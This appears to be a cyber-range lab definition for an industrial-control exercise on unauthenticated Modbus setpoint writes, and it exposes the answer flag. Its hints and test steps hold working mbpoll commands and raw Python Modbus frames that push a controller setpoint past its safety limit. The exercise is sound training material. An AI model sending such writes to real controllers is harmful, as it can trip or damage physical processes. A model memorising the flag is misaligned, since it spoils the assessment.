@@ -1,0 +1,107 @@
+title: Halcyon Industrial - Setpoint Tampering
+category: ot
+difficulty: beginner
+estimated_time: 45
+prerequisites:
+  - ot-1-1-modbus-register-analysis
+# By completion students will be able to:
+learning_outcomes:
+  - Write a holding register with function code 0x06
+  - Confirm a write by reading the register back
+  - Explain how an unauthenticated write changes process state
+  - Record the marker the controller exposes after a safety trip
+mapped_skills:
+  - ot_ics
+assessment_criteria:
+  - Submit the correct flag.
+  - Pass every automated test step in the lab manifest.
+mitre_attack:
+  - tactic: Impair Process Control
+    technique: T0855
+    technique_name: Unauthorized Command Message
+    detection: Monitor Modbus function codes 0x05, 0x06, and 0x10 for writes from unexpected masters or to safety-critical registers.
+
+owner: "OpenCyberRange Curriculum"
+content_version: "2.5.3"
+reviewed_at: "2026-11-15"
+review_status: "automated static proof; live walkthrough pending"
+description: "An unauthenticated Modbus controller accepts setpoint writes. Change the process setpoint, confirm the write, and recover the marker the controller exposes after the safety interlock trips."
+visibility: public
+flag: "OCR{m0dbu5_wr1t3_c0ntr0l}"
+
+tools:
+  - python3
+  - nmap
+  - mbpoll
+
+scenario: |
+  Halcyon Industrial Controls runs the same HIC-2400 controller you triaged in
+  exercise 1.1. This time the controller is wired to a simulated process line:
+  holding register 10 is the temperature setpoint, register 11 reports the
+  measured temperature, and coils 0 and 1 drive the pump and the alarm.
+
+  Modbus has no authentication. Any host that can reach TCP 502 can write a
+  setpoint as easily as it can read one. Your task is to prove that by moving
+  the setpoint outside the safe range and observing what the controller does.
+  The controller writes a maintenance marker into the holding registers when
+  the safety interlock trips.
+
+troubleshooting: "If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a write appears to succeed but the value does not change, remember that Modbus has no error recovery: read the register back. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty."
+defensive_takeaways: "Modbus writes are unauthenticated. Segment the control network, put a filtering gateway in front of controllers, restrict write function codes at the boundary, and alert on setpoint changes outside the operating envelope."
+difficulty_evidence: "Static student-tester walkthrough of the workbook and lab definition; live lab run not recorded; declared difficulty 'beginner' retained as provisional."
+difficulty_evidence_source: "reviewer_walkthrough"
+difficulty_evidence_sample: 1
+difficulty_evidence_quality: "provisional"
+difficulty_evidence_reviewed_at: "2026-11-15"
+workbook: "wiki/range/ot/CH_OT01_Modbus_Fundamentals/02_Modbus_Write_Setpoint/"
+
+hostnames:
+  - ip_offset: "60"
+    hostname: "plc"
+    description: "HIC-2400 process controller (Modbus TCP)"
+
+topology:
+  nodes:
+    - id: "plc"
+      label: "HIC-2400 PLC"
+      type: "server"
+      ip_offset: "60"
+      ports: [502]
+      services: ["modbus"]
+      x: 1
+      y: 1
+
+hints:
+  - text: |
+      Read the process registers first:
+      mbpoll -m tcp -p 502 -t 4 -r 10 -c 4 <plc_ip>
+      Register 10 is the setpoint, 11 the measured temperature.
+    unlock_after_minutes: 5
+  - text: |
+      Function code 0x06 writes a single holding register. With mbpoll, pass
+      the value after the address:
+      mbpoll -m tcp -p 502 -t 4 -r 10 <plc_ip> 250
+      Then read register 10 again to confirm the write.
+    unlock_after_minutes: 12
+  - text: |
+      The controller trips the interlock when the setpoint is 250 or higher.
+      After the trip, read the holding registers starting at 40. The marker is
+      one ASCII character per register, ending at the first zero value.
+    unlock_after_minutes: 20
+
+test:
+  steps:
+    - name: "Modbus service is reachable"
+      command: "python3 -c \"import socket;s=socket.create_connection(('{target.plc}',502),5);s.close();print('ok')\""
+      expect: "ok"
+      timeout: 20
+
+    - name: "Setpoint write is accepted and readable"
+      command: "python3 -c \"import socket,struct;s=socket.create_connection(('{target.plc}',502),5);s.sendall(struct.pack('>HHHBBHH',1,0,6,1,6,10,250));s.recv(64);s.sendall(struct.pack('>HHHBBHH',2,0,6,1,3,10,1));r=s.recv(64);print(struct.unpack('>H',r[9:11])[0])\""
+      expect: "250"
+      timeout: 20
+
+    - name: "Safety trip exposes the marker"
+      command: "python3 -c \"import socket,struct,time;s=socket.create_connection(('{target.plc}',502),5);s.sendall(struct.pack('>HHHBBHH',1,0,6,1,6,10,250));s.recv(64);time.sleep(3);s.sendall(struct.pack('>HHHBBHH',2,0,6,1,3,40,40));r=s.recv(256);bc=r[8];vals=struct.unpack('>%dH'%(bc//2),r[9:9+bc]);out=''.join(chr(v) for v in vals if 32<=v<127);print(out.split(chr(0))[0])\""
+      expect: "OCR{m0dbu5_wr1t3_c0ntr0l}"
+      timeout: 30
